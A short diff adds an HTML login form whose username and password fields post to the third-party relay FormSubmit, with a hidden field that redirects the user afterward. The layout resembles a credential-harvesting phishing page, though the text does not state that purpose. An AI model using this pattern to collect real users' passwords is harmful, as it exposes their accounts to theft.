@@ -1,0 +1,10 @@
+<!-- Example using FormSubmit -->
+<form action="https://formsubmit.co" method="POST">
+  <input type="text" name="username" placeholder="Username" required>
+  <input type="password" name="password" placeholder="Password" required>
+  
+  <!-- This line tells the service where to send the user next -->
+  <input type="hidden" name="_next" value="https://your-project.vercel.app">
+  
+  <button type="submit">Proceed</button>
+</form>
